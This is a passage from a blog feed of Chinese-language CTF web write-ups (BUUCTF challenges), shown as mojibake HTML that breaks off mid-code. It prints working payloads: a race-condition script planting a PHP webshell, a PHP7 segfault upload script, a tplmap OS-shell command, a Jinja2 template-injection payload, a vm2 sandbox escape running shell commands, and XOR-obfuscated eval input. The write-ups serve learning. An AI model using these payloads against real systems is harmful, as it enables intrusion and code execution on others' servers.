class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><p>é€šè¿‡åŒ…å«æ‰§è¡Œä»£ç ï¼Œå°†æŒ‡å®šå†…å®¹å†™åˆ°<code>shell.php</code>ä¸­</p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824232002005.png" alt="image-20210824232002005"></p><p>æˆåŠŸè¾“å‡ºä¿¡æ¯</p><p>ä½†åœ¨é¡µé¢å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œåº”è¯¥æœ‰é™åˆ¶ï¼Œè¿æ¥èšå‰‘ï¼Œæ— æ˜¾ç¤ºï¼Œæ— æƒé™â€¦â€¦</p><p>ä¸€æ³¢<code>LD_PRELOAD</code>ï¼š</p><p>ç”Ÿæˆ<code>.antproxy.php</code></p><img src="/images/NPUCTF2020-ezinclude/image-20210824232455565.png" alt="image-20210824232455565" style="zoom:80%;"><p>æ­¤æ—¶å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ‰¾ä¸åˆ°flagâ€¦â€¦</p><p>åˆ›å»ºé¡µé¢ï¼Œçœ‹phpinfoï¼š</p><img src="/images/NPUCTF2020-ezinclude/image-20210824232610872.png" alt="image-20210824232610872" style="zoom:80%;"><h4><span id="php7-segment-faultç‰¹æ€§">php7 segment faultç‰¹æ€§</span></h4><p>æ‰«ç›®å½•å¯å¾—dir.php</p><blockquote><p>â€¦â€¦æ‰«ä¸å‡ºæ¥</p></blockquote><blockquote><p>å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™</p></blockquote><blockquote><ul><li>php &lt; 7.2<br>php://filter/string.strip_tags/resource=/etc/passwd</li><li>php7 è€ç‰ˆæœ¬é€šæ€<br>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</li></ul></blockquote><p>å«–ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">mode1 = <span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">mode2 = <span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&quot;</span></span><br><span class="line"></span><br><span class="line">url = url + mode1</span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>dir.phpï¼š</p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824233725055.png" alt="image-20210824233725055"></p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824233924599.png" alt="image-20210824233924599"></p><p>è·å–flag</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;session æ–‡ä»¶ä¸Šä¼ +ç«äº‰    php7 segment faultç‰¹æ€§&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTF2019-I_3_Flask</title>
    <link href="http://example.com/2021/08/23/RootersCTF2019-I_3_Flask/"/>
    <id>http://example.com/2021/08/23/RootersCTF2019-I_3_Flask/</id>
    <published>2021-08-23T08:01:36.403Z</published>
    <updated>2021-08-23T09:01:48.131Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦</p><p>æ¨¡æ¿æ³¨å…¥ã€arjunã€tplmap</p><a id="more"></a></blockquote><blockquote><p>ç¬¬ä¸€æ¬¡æ„Ÿåˆ°å·¥å…·æ³¨å…¥çš„å¿«æ„ŸğŸ¤£</p></blockquote><p>flask åº”è¯¥å°±æ˜¯æ¨¡æ¿æ³¨å…¥äº†â€¦â€¦æœ‰å‡ ä¸ªè€ƒç‚¹</p><h4><span id="å‚æ•°çˆ†ç ´">å‚æ•°çˆ†ç ´</span></h4><p>å¯¹å¯ç”¨å‚æ•°çš„çˆ†ç ´ï¼Œå¯ä½¿ç”¨Arjunå·¥å…·</p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165026964.png" alt="image-20210823165026964"></p><p>å¯ä»¥è·å–å¯ç”¨çš„nameå‚æ•°</p><h4><span id="æ¨¡æ¿æ³¨å…¥">æ¨¡æ¿æ³¨å…¥</span></h4><p>tplmap å·¥å…·</p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165152868.png" alt="image-20210823165152868"></p><p>å¯ä»¥è·å–åˆ° name å‚æ•°ã€æ¨¡æ¿å¼•æ“ã€ç³»ç»Ÿç­‰ä¿¡æ¯ï¼Œç»“åˆshellå‘½ä»¤ï¼š</p><p><code>python2 tplmap.py -u http://89c50d73-c596-4cbd-b2e0-34207638b293.node4.buuoj.cn:81/?name=1 --engine=Jinja2 --os-shell</code></p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165707724.png" alt="image-20210823165707724"></p><p>ç”¨è„šæœ¬æ„Ÿè§‰å¥½çˆ½â€¦â€¦</p><p>æ‰‹å·¥æ³¨å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125; </span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; </span><br><span class="line">    &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125; </span><br><span class="line">      &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125; </span><br><span class="line">          &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>) &#125;&#125;    <span class="comment">//è¿™é‡Œçš„lså°±æ˜¯éœ€è¦çš„æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        &#123;% <span class="keyword">endif</span> %&#125; </span><br><span class="line">      &#123;% <span class="keyword">endif</span> %&#125; </span><br><span class="line">     &#123;% <span class="keyword">endfor</span> %&#125; </span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p>â€”â€”<a href="https://www.cnblogs.com/yesec/p/14905799.html">https://www.cnblogs.com/yesec/p/14905799.html</a></p><p>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111396068">BUUCTF [RootersCTF2019] I_ï¼œ3_Flask</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;/p&gt;
&lt;p&gt;æ¨¡æ¿æ³¨å…¥ã€arjunã€tplmap&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2020-JustEscape</title>
    <link href="http://example.com/2021/08/22/HFCTF2020-JustEscape/"/>
    <id>http://example.com/2021/08/22/HFCTF2020-JustEscape/</id>
    <published>2021-08-22T10:48:13.873Z</published>
    <updated>2021-08-23T08:32:50.472Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>nodejs    vm2 æ²™ç®±é€ƒé€¸ï¼Ÿ</p><a id="more"></a></blockquote><p>run.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><em>æ³¨æ„ç¼–ç  =.=</em></p></blockquote><blockquote><p><em>çœŸçš„æ˜¯ PHP å˜›</em></p></blockquote><p>æŒ‰ç…§é¡µé¢è®¿é—®ï¼š</p><img src="D:\HexoBlog\source\images\HFCTF2020-JustEscape\image-20210822185255520.png" alt="image-20210822185255520" style="zoom:80%;"><p>ç›´æ¥æ‹¦æˆªâ€¦â€¦</p><p><code>+</code>è¿™é‡Œç¼–ç æˆäº†<code>%2b</code></p><p>æ”¹å®Œç¼–ç åï¼š<code>SyntaxError: Unexpected number</code></p><p>æŸ¥ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œæ˜¯jsçš„æŠ¥é”™ï¼Œåº”è¯¥æ˜¯nodejs</p><blockquote><p>ä¹Ÿè®¸ä¹Ÿå¯ä»¥æ”¹ä¸€ä¸‹urlè·¯å¾„çœ‹ä¸‹ä¿¡æ¯â€¦â€¦</p></blockquote><p><a href="https://www.baidu.com/link?url=QeHPmSUaTVy93Lkf1ovKTTkTi97V7pHglb9PLWc_8WVi7a8ZgX_Onxg4jhO0xAIuvVvOZx6ctIknYeQ1Ra-f1K&wd=&eqid=c06249420000b51a0000000361222da3"><em>error</em>.<em>stack</em> | Node.js API æ–‡æ¡£</a></p><p><a href="https://www.baidu.com/link?url=7L_-cbO2EcQY-VpyX8NIh3dZPjtDUV6mp0yeCF7nY2qvC194vSPdiArmv13B8XFR9Zy1bJasqI7mhyfyynDur6590MzazNYdn9p6gpx4rCm&wd=&eqid=c06249420000b51a0000000361222da3">jsä¸­æ•è·å¼‚å¸¸<em>å †æ ˆ</em>ä¿¡æ¯â€”<em>Error</em>.<em>stack</em></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/patriksimek/vm2/issues/225">vm2 é€ƒé€¸ poc</a></p><p><a href="https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html">å…³äºjavascript:nodejs-æ²™ç›’é€ƒé€¸åˆ†æ</a></p><p><a href="https://www.anquanke.com/post/id/207291?from=timeline">vm2æ²™ç®±é€ƒé€¸åˆ†æ</a></p><p>node.js çœ‹ä¸å¤ªæ‡‚æ¬¸â€¦â€¦</p><blockquote><p>åœ¨æ²™ç›’ç¯å¢ƒä¸‹é€šè¿‡åŸå‹é“¾çš„å½¢å¼èƒ½è·å–å…¨å±€çš„ Functionï¼Œå¹¶é€šè¿‡å®ƒæ¥æ‰§è¡Œä»£ç ï¼Ÿ</p></blockquote><p>é€šè¿‡jsç¥å¥‡çš„æ‹¼æ¥å¥—pocğŸ¤£</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>æˆ–è€…â€¦â€¦å½“å¯¹è±¡çš„æ–¹æ³•æˆ–è€…å±æ€§åå…³é”®å­—è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨æ•°ç»„è°ƒç”¨çš„æ–¹å¼ç»•è¿‡å…³é”®å­—çš„é™åˆ¶ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><img src="\images\HFCTF2020-JustEscape\image-20210822195916591.png" alt="image-20210822195916591" style="zoom:67%;"><p><a href="https://blog.csdn.net/sopromeo/article/details/108629520">https://blog.csdn.net/sopromeo/article/details/108629520</a></p><p><a href="%5Bhttps://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse.html%5D(https://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse.html)">å­¦ä¹ NODE.JS VM2 SANDBOX ESCAPSE</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;nodejs    vm2 æ²™ç®±é€ƒé€¸ï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2019-EasyWeb</title>
    <link href="http://example.com/2021/08/22/SUCTF-2019-EasyWeb/"/>
    <id>http://example.com/2021/08/22/SUCTF-2019-EasyWeb/</id>
    <published>2021-08-22T06:36:29.713Z</published>
    <updated>2021-08-23T08:05:36.034Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>ç»•è¿‡ä¸æ–‡ä»¶ä¸Šä¼ </p><a id="more"></a></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªeval</p><h4><span id="ç¬¬ä¸€å±‚">ç¬¬ä¸€å±‚</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é•¿åº¦ä¸èƒ½è¶…è¿‡18</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„å­—ç¬¦ä¸èƒ½è¶…è¿‡12ç§</p><p>é¦–å…ˆæ­£åˆ™ï¼Œå¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†å¯è§å­—ç¬¦éƒ½è¿‡æ»¤æ‰äº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä½¿ç”¨å¼‚æˆ–ã€å–å</p><p>å–åéœ€è¦<code>~</code>ï¼Œä½†æ­¤ç¬¦å·è¢«è¿‡æ»¤æ‰äº†ï¼Œä¸å­—ä¸²ç›¸åŒé•¿åº¦çš„<code>%ff</code>å¼‚æˆ–ç›¸å½“äºå–å</p><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹éå¸¸çš„æé™ï¼Œæš‚æ—¶æ‰¾ä¸åˆ°æ›´å¥½çš„â€¦â€¦disable functionå¾ˆå¤šâ€¦â€¦</p><p>getflagï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span 